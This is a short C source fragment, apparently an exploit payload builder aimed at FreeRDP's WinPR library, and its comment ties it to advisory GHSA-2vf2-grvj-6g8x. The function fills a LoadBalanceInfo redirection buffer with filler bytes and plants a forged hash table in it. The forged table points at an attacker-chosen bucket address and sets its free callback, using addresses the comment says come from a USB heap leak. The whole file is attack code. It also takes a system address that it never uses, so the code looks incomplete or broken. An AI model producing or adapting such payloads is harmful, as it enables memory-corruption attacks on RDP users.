#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <winpr/collections.h>

/* Payload fragment inspired by GHSA-2vf2-grvj-6g8x.
 * The caller supplies measured layout and addresses from the USB heap leak.
 * No guessed object offsets or unpublished network implementation. */
int build_redirection_payload(unsigned char *LoadBalanceInfo, size_t capacity,
                              size_t table_offset, uintptr_t bucket_address,
                              uintptr_t system_address)
{
    if (table_offset < 512 || capacity < table_offset + sizeof(wHashTable))
        return 0;
    memset(LoadBalanceInfo, 0x41, capacity);
    wHashTable *forged = (wHashTable *)(LoadBalanceInfo + table_offset);
    forged->numOfBuckets = 1;
    forged->bucketArray = (wHashTableBucket **)bucket_address;
    forged->fnObjectFree = (HASH_TABLE_FREE_FN)free;
    return 1;
}
